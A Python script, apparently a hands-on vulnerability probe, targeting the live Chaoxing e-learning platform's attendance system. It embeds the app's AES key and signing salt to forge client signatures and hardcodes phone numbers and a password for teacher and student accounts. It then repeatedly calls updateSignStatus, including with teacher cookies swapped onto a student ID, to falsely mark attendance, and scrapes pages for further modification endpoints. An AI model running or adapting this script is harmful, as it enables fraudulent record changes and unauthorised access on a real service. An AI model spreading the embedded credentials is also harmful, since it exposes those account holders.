import base64, hashlib, json, os, uuid, requests, urllib3, re, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from datetime import datetime

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def mobile_login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try:
        s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except:
        pass
    try:
        s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except:
        pass
    return s, puid

def web_login(phone, pwd):
    s = requests.Session()
    s.verify = False
    web_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"
    s.headers.update({"User-Agent": web_ua})

    r = s.get("https://passport2.chaoxing.com/login?loginType=4&newversion=true&fid=-1&refer=http://i.chaoxing.com", timeout=20)
    print(f"  Web登录页面: HTTP {r.status_code}, len={len(r.text)}")

    r = s.post("https://passport2.chaoxing.com/fanyalogin",
               data={"fid": "-1", "uname": phone, "password": pwd,
                     "refer": "http://i.chaoxing.com", "t": "true",
                     "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0"},
               headers={"X-Requested-With": "XMLHttpRequest"},
               allow_redirects=False, timeout=30)
    print(f"  Web登录: HTTP {r.status_code}, {r.text[:200]}")

    puid = ""
    uf = ""
    _d = ""
    vc3 = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
        elif c.name == "uf":
            uf = c.value
        elif c.name == "_d":
            _d = c.value
        elif c.name == "VC3":
            vc3 = c.value

    try:
        s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except:
        pass

    for c in s.cookies:
        if c.name == "uf" and not uf:
            uf = c.value
        elif c.name == "_d" and not _d:
            _d = c.value
        elif c.name == "VC3" and not vc3:
            vc3 = c.value

    print(f"  Web登录: puid={puid}, uf={uf[:20] if uf else 'N/A'}, _d={_d[:20] if _d else 'N/A'}, vc3={vc3[:20] if vc3 else 'N/A'}")
    return s, puid, uf, _d, vc3

def safe_json(r):
    try:
        return r.json()
    except:
        return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

results = []

def rec(tag, detail, evidence=""):
    results.append({"tag": tag, "detail": detail, "evidence": evidence[:800]})
    vuln = "修改成功" in detail or "success" in evidence.lower()[:100] or "签到成功" in detail
    icon = "🔴" if vuln else "  "
    print(f"  {icon} {tag}: {detail[:200]}")

def run():
    print("=" * 80)
    print(f"签到状态修改漏洞深入测试 - Web登录 + 教师管理页面API")
    print(f"时间: {datetime.now():%Y-%m-%d %H:%M:%S}")
    print("=" * 80)

    print("\n[1] 移动端登录...")
    s_t, puid_t = mobile_login("19712720708", "3.1415926Cpy")
    s_s, puid_s = mobile_login("18436633997", "3.1415926Cpy")
    print(f"  教师puid={puid_t}, 学生puid={puid_s}")

    print("\n[2] Web端登录...")
    s_wt, puid_wt, uf_t, _d_t, vc3_t = web_login("19712720708", "3.1415926Cpy")
    s_ws, puid_ws, uf_s, _d_s, vc3_s = web_login("18436633997", "3.1415926Cpy")

    base = "https://mobilelearn.chaoxing.com"
    ajax_hdr = {"Referer": "https://mobilelearn.chaoxing.com/", "X-Requested-With": "XMLHttpRequest"}

    print("\n[3] 获取签到活动列表...")
    r = s_s.get(f"{base}/ppt/activeAPI/taskactivelist",
                params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    active_ids = []
    if isinstance(d, dict) and "activeList" in d:
        for item in d["activeList"]:
            aid = str(item.get("id", ""))
            atype = item.get("activeType", "")
            status = item.get("status", "")
            name = item.get("nameOne", "")
            active_ids.append({"id": aid, "type": str(atype), "status": str(status), "name": name})
    print(f"  找到 {len(active_ids)} 个签到活动")

    test_aid = active_ids[0]["id"] if active_ids else "5000163767353"

    print("\n" + "=" * 80)
    print("[4] Web登录Session测试updateSignStatus")
    print("=" * 80)

    r = s_ws.post(f"{base}/pptSign/updateSignStatus",
                  data={"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                        "uid": puid_ws, "studentId": puid_ws, "status": "1"},
                  headers=ajax_hdr, timeout=20)
    rec("T4-01", f"Web学生 updateSignStatus: {r.text[:100]}", r.text[:300])

    r = s_wt.post(f"{base}/pptSign/updateSignStatus",
                  data={"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                        "uid": puid_wt, "studentId": puid_ws, "status": "1"},
                  headers=ajax_hdr, timeout=20)
    rec("T4-02", f"Web教师 updateSignStatus: {r.text[:100]}", r.text[:300])

    print("\n" + "=" * 80)
    print("[5] 教师管理页面 - 签到结果管理API探索")
    print("=" * 80)

    r = s_wt.get("https://mooc1.chaoxing.com/mycourse/teacherindex",
                 params={"courseid": COURSE_ID, "clazzid": CLASS_ID},
                 timeout=20, allow_redirects=True)
    rec("T5-01", f"教师管理页面: HTTP {r.status_code}, len={len(r.text)}", r.text[:500])

    r = s_wt.get("https://mooc1.chaoxing.com/edudepartment/teacherindex",
                 params={"courseid": COURSE_ID, "clazzid": CLASS_ID},
                 timeout=20, allow_redirects=True)
    rec("T5-02", f"教师管理页面(edudepartment): HTTP {r.status_code}, len={len(r.text)}", r.text[:500])

    print("\n" + "=" * 80)
    print("[6] 签到结果管理页面API探索")
    print("=" * 80)

    for act in active_ids[:3]:
        aid = act["id"]
        r = s_wt.get(f"{base}/pptSign/signedResult",
                     params={"activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_wt},
                     headers={"Referer": f"{base}/"}, timeout=20)
        if r.status_code == 200 and len(r.text) > 100:
            api_patterns = set(re.findall(r'["\']([^"\']*(?:updateSign|modifySign|changeSign|signStatus|signedResult|pptSign|activeAPI)[^"\']*)["\']', r.text, re.I))
            ajax_urls = set(re.findall(r'url:\s*["\']([^"\']+)["\']', r.text))
            post_urls = set(re.findall(r'\.post\(["\']([^"\']+)["\']', r.text))
            get_urls = set(re.findall(r'\.get\(["\']([^"\']+)["\']', r.text))
            all_urls = api_patterns | ajax_urls | post_urls | get_urls
            rec(f"T6-signed-{aid[:8]}", f"signedResult页面API: {all_urls}, len={len(r.text)}", r.text[:500])

            js_patterns = re.findall(r'src=["\']([^"\']*\.js)["\']', r.text)
            for js_url in js_patterns[:5]:
                if not js_url.startswith("http"):
                    js_url = f"{base}{js_url}" if js_url.startswith("/") else f"{base}/{js_url}"
                try:
                    r_js = s_wt.get(js_url, timeout=15)
                    if r_js.status_code == 200 and len(r_js.text) > 100:
                        js_apis = set(re.findall(r'["\']([^"\']*(?:updateSign|modifySign|changeSign|signStatus|signedResult|pptSign|activeAPI)[^"\']*)["\']', r_js.text, re.I))
                        js_ajax = set(re.findall(r'url:\s*["\']([^"\']+)["\']', r_js.text))
                        js_post = set(re.findall(r'\.post\(["\']([^"\']+)["\']', r_js.text))
                        all_js_urls = js_apis | js_ajax | js_post
                        if all_js_urls:
                            rec(f"T6-JS-{js_url.split('/')[-1][:15]}", f"JS API: {all_js_urls}", str(all_js_urls)[:300])
                except:
                    pass
        else:
            rec(f"T6-signed-{aid[:8]}", f"signedResult: HTTP {r.status_code}, len={len(r.text)}")

    print("\n" + "=" * 80)
    print("[7] 使用uf/_d/vc3 Cookie调用updateSignStatus")
    print("=" * 80)

    s_web_only = requests.Session()
    s_web_only.verify = False
    s_web_only.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
    if uf_s:
        s_web_only.cookies.set("uf", uf_s, domain=".chaoxing.com", path="/")
    if _d_s:
        s_web_only.cookies.set("_d", _d_s, domain=".chaoxing.com", path="/")
    if vc3_s:
        s_web_only.cookies.set("VC3", vc3_s, domain=".chaoxing.com", path="/")
    s_web_only.cookies.set("UID", puid_s, domain=".chaoxing.com", path="/")
    s_web_only.cookies.set("_uid", puid_s, domain=".chaoxing.com", path="/")

    r = s_web_only.post(f"{base}/pptSign/updateSignStatus",
                        data={"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                              "uid": puid_s, "studentId": puid_s, "status": "1"},
                        headers=ajax_hdr, timeout=20)
    rec("T7-01", f"uf/_d/VC3学生 updateSignStatus: {r.text[:100]}", r.text[:300])

    s_web_teacher = requests.Session()
    s_web_teacher.verify = False
    s_web_teacher.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
    if uf_t:
        s_web_teacher.cookies.set("uf", uf_t, domain=".chaoxing.com", path="/")
    if _d_t:
        s_web_teacher.cookies.set("_d", _d_t, domain=".chaoxing.com", path="/")
    if vc3_t:
        s_web_teacher.cookies.set("VC3", vc3_t, domain=".chaoxing.com", path="/")
    s_web_teacher.cookies.set("UID", puid_t, domain=".chaoxing.com", path="/")
    s_web_teacher.cookies.set("_uid", puid_t, domain=".chaoxing.com", path="/")

    r = s_web_teacher.post(f"{base}/pptSign/updateSignStatus",
                           data={"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                                 "uid": puid_t, "studentId": puid_s, "status": "1"},
                           headers=ajax_hdr, timeout=20)
    rec("T7-02", f"uf/_d/VC3教师 updateSignStatus: {r.text[:100]}", r.text[:300])

    print("\n" + "=" * 80)
    print("[8] 学生使用教师uf/_d/VC3 Cookie越权")
    print("=" * 80)

    s_cross = requests.Session()
    s_cross.verify = False
    s_cross.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
    if uf_t:
        s_cross.cookies.set("uf", uf_t, domain=".chaoxing.com", path="/")
    if _d_t:
        s_cross.cookies.set("_d", _d_t, domain=".chaoxing.com", path="/")
    if vc3_t:
        s_cross.cookies.set("VC3", vc3_t, domain=".chaoxing.com", path="/")
    s_cross.cookies.set("UID", puid_s, domain=".chaoxing.com", path="/")
    s_cross.cookies.set("_uid", puid_s, domain=".chaoxing.com", path="/")

    r = s_cross.post(f"{base}/pptSign/updateSignStatus",
                     data={"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                           "uid": puid_s, "studentId": puid_s, "status": "1"},
                     headers=ajax_hdr, timeout=20)
    rec("T8-01", f"教师uf+学生UID updateSignStatus: {r.text[:100]}", r.text[:300])

    s_cross2 = requests.Session()
    s_cross2.verify = False
    s_cross2.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
    if uf_t:
        s_cross2.cookies.set("uf", uf_t, domain=".chaoxing.com", path="/")
    if _d_t:
        s_cross2.cookies.set("_d", _d_t, domain=".chaoxing.com", path="/")
    if vc3_t:
        s_cross2.cookies.set("VC3", vc3_t, domain=".chaoxing.com", path="/")
    s_cross2.cookies.set("UID", puid_t, domain=".chaoxing.com", path="/")
    s_cross2.cookies.set("_uid", puid_t, domain=".chaoxing.com", path="/")

    r = s_cross2.post(f"{base}/pptSign/updateSignStatus",
                      data={"activeId": test_aid, "classId": CLASS_ID, "courseId": COURSE_ID,
                            "uid": puid_t, "studentId": puid_s, "status": "1"},
                      headers=ajax_hdr, timeout=20)
    rec("T8-02", f"教师uf+教师UID updateSignStatus: {r.text[:100]}", r.text[:300])

    print("\n" + "=" * 80)
    print("[9] 签到管理页面 - 教师修改签到结果的API")
    print("=" * 80)

    for act in active_ids[:3]:
        aid = act["id"]
        r = s_wt.get(f"{base}/pptSign/signedResult",
                     params={"activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_wt},
                     headers={"Referer": f"{base}/"}, timeout=20)
        if r.status_code == 200 and len(r.text) > 100:
            if "updateSignStatus" in r.text:
                rec(f"T9-{aid[:8]}", f"signedResult页面包含updateSignStatus!")
            if "modifySign" in r.text:
                rec(f"T9-{aid[:8]}", f"signedResult页面包含modifySign!")
            onclick_handlers = re.findall(r'onclick="([^"]*)"', r.text)
            for handler in onclick_handlers:
                if any(kw in handler.lower() for kw in ['sign', 'status', 'modify', 'update', 'change']):
                    rec(f"T9-onclick-{aid[:8]}", f"onclick handler: {handler[:200]}")

            href_links = re.findall(r'href="([^"]*)"', r.text)
            for link in href_links:
                if any(kw in link.lower() for kw in ['sign', 'status', 'modify', 'update', 'change']):
                    rec(f"T9-href-{aid[:8]}", f"href link: {link[:200]}")

    print("\n" + "=" * 80)
    print("[10] 保存结果")
    print("=" * 80)

    report_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "web_sign_vuln_results.json")
    with open(report_file, "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)
    print(f"  结果已保存到: {report_file}")
    print(f"  共 {len(results)} 项测试")

if __name__ == "__main__":
    run()
